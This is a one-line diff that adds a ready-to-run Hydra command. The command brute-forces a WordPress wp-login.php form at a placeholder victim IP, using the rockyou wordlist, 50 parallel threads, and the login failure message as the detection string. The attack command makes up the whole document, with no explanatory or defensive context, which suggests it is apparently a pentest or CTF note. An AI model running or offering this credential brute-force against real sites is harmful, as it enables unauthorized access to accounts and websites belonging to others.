@@ -1,0 +1,1 @@
+hydra VICTIM_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 50 -f -P /usr/share/wordlists/rockyou.txt -l USER 
